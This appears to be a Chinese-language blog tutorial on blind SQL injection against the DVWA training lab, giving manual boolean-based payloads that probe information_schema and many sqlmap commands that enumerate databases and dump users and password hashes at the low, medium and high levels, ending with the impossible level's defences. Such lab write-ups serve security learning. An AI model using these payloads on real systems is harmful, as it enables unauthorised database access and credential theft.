---
title: dvwa--盲注
tags:
  - DVWA
categories:
  - 学习
  - web安全
  - DVWA
abbrlink: 75e4ecec
date: 2022-05-25 12:59:54
---





## 概念

一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

## 步骤

**手工 VS 自动化**：
①手工测试有助于理解整个注入漏洞的利用过程，可以加深技能印象
②自动化工具所检测的效率相对较高，而且覆盖的全面性更高，数据获取的广度和深度也可以得到更好的发挥



### 手工盲注

**因为服务器只会回答存在或者不存在，所以通过设定是否条件，逐步接近想要知道的答案（类似于猜价格）因为手动注入过于繁琐所以只演示low的部分**

#### low（基于布尔型）

（1）判断是否存在注入，注入是字符型还是数字型

```
1' and 1=1 #
```

```
1' and '1'='2' #
```

（2）猜解当前数据库名
a. 名字字符数量（长度）

```
1'  and length(database())=1 #     
```

  一次修改  =1 、=2、=3... ...,直到显示USER ID 存在
答案   4
b.按顺序猜解每个字符（ASCII）
下面采用二分法猜解数据库名。
输入

```
1' and ascii(substr(database(),1,1))>97 #
1' and ascii(substr(database(),1,1))<150 #
... ...(缩小范围)
1' and ascii(substr(database(),1,1))=97 #
先缩小范围在最终确认

```

显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；


（3）猜解数据库中的表名
a.表的数量

```
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 #
```

答案：2
b.按顺序猜解表的名称的字符长度

```
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #
```

 显示存在，第一张表：长度：  9

```
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # 
```


显示存在，第一张表：长度：  5

b.按顺序猜解表的名称的每个字符
第一张表第一个字符：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 
... ...
（方法同上，先缩小范围在最终确认）
```

显示不存在  第一个字符：g
第一张表第一个字符：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>117 #
```

 显示不存在  第二个字符：u
....
第一张表名称：guestbook

第二张表的第一个字符：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>117 #
```

显示不存在  第一个字符：u
第二张表的第二个字符：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))>115 #
```

显示不存在  第二个字符：s
....
第二张表名称：users

（4）猜解表中的字段名
a.users表字段的数量

```
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 #
```

b.按顺序猜解每个字段字符长度

```
1' and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit 0,1),1))=7 #
```

 显示存在
说明users表的第一个字段为7个字符长度。

```
1' and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit 1,1),1))=10 #
```

 显示存在,说明users表的第二个字段为10个字符长度。
....
c.按顺序猜解每个字段字符每个字符
第一个字段的第一个字符

```
1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))>117 #
```


第一个字段的第二个字符

```
1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),2,1))>115 #
```

....
第二个字段的第一个字符

```
1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1))>117 #
```

第二个字段的第二个字符

```
1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),2,1))>115 #
```

...
（5）猜解数据

... ...



### 利用sqlmap工具

sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。

**利用SQLMap自动化工具的检测流程大致如下：**
 1.判断是否存在注入点、注入类型
 2.获取DBMS中所有的数据库名称
 3.获取Web应用当前连接的数据库
 4.列出数据库中的所有用户
 5.获取Web应用当前所操作的用户
 6.列出可连接数据库的所有账户-对应的密码哈希
 7.列出指定数据库中的所有数据表
 8.列出指定数据表中的所有字段（列）
 9.导出指定数据表中的列字段进行保存
 10.根据导出的数据，验证数据有效性

#### low

**提交的数据是通过GET请求方式，直接在浏览器URL中传递参数**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#"
```

![1](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124648.png)



发现跳转到登录界面，需要cookies来维持会话

**查看cookie**



![3](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124650.png)

![2](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124651.png)



**在sqlmap中输入：``sqlmap –u ‘复制的URL’ --cookie=’复制的cookie’`` ，查看数据库类型**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4"
or
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch
```

![4](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124653.png)



发现此为get型、id注入点为布尔)型盲注，并扫出了版本号

**查询所有数据库**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch --dbs
```

![5](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124655.png)



**查询当前数据库**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch --current-db
```



![6](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124657.png)

**列出数据库中的所有用户**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch --users
```



![7](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124659.png)



**获取Web应用当前所操作的用户**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch --current-user
```

![8](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124702.png)

**列出可连接数据库的所有账户-对应的密码哈希**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch --passwords
```

![10](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124703.png)



**列出指定数据库中的所有数据表**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch -D dvwa –tables
```

![11](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124706.png)



**列出指定数据表中的所有字段（列）**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch -D dvwa -T users --columns
```



![12](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124707.png)



**导出指定数据表中的列字段进行保存**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4" --batch -D dvwa -T users -C “user,password” –dump
```



![13](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124709.png)

#### Medium

Low等级提交的数据是通过GET请求方式，直接在浏览器url中传递参数；而Medium等级，所提交的User ID数据是通过POST请求方式，参数是在POST请求体中传递。此时，构造SQLMap操作命令，需要将url和data分成两部分分别填写，同时需要更新Cookie信息的取值

构造命令：

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch
```



![14](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124712.png)



**查询所有数据库**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --dbs
```



![15](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124714.png)

**查询当前数据库**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --current-db
```

![16](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124716.png)



**列出数据库中的所有用户**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --users
```

![17](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124718.png)



**获取Web应用当前所操作的用户**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --current-user
```

![18](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124721.png)



**列出可连接数据库的所有账户-对应的密码哈希**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --passwords
```

![19](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124722.png)



**列出指定数据库中的所有数据表**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa –tables
```

![20](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124725.png)



**列出指定数据表中的所有字段（列）**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa -T users --columns
```

![21](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124726.png)





**导出指定数据表中的列字段进行保存**

```
 sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --cookie="security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa -T users -C “user,password” –dump
```

![22](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124728.png)







#### High 

High级别的查询数据提交的页面，查询结果显示的页面分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET 请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。
High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没有办法进一步注入；但并不代表High级别不能使用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作。如：--second-url="xxxurl"(设置第二阶段响应的结果显示页面的url，旧版使用--second-order=)



构造命令：

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch
```

![23](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124730.png)





**查询所有数据库**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --dbs
```



![24](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124732.png)

**查询当前数据库**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --current-db
```

![25](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124734.png)



**列出数据库中的所有用户**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --users
```



![26](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124736.png)

**获取Web应用当前所操作的用户**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --current-user
```

![27](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124737.png)



**列出可连接数据库的所有账户-对应的密码哈希**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch --passwords
```

![28](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124739.png)



**列出指定数据库中的所有数据表**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa –tables
```

![29](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124741.png)



**列出指定数据表中的所有字段（列）**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa -T users --columns
```

![30](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124742.png)



**导出指定数据表中的列字段进行保存**

```
sqlmap -u "192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --data="id=1&Submit=Submit" --second-url="192.168.224.135/dvwa/vulnerabilities/sqli_blind/"  --cookie="security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5" --batch -D dvwa -T users -C “user,password” –dump
```

![31](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124744.png)







#### lmpossible

impossible.php代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入

只有当返回的查询结果数量为一个记录时，才会成功输出，这样就有效预防了暴库

利用is_numeric($id)函数来判断输入的id是否是数字or数字字符串，满足条件才知晓query查询语句

Anti-CSRF token机制的加入了进一步提高了安全性，session_token是随机生成的动态值，每次向服务器请求，客户端都会携带最新从服务端已下发的session_token值向服务器请求作匹配验证，相互匹配才会验证通过



<br>

部分参考来自：[DVWA--SQL Injection(Blind)盲注--SQLMap测试过程解析](https://www.jianshu.com/p/ec2ca79e74b2)
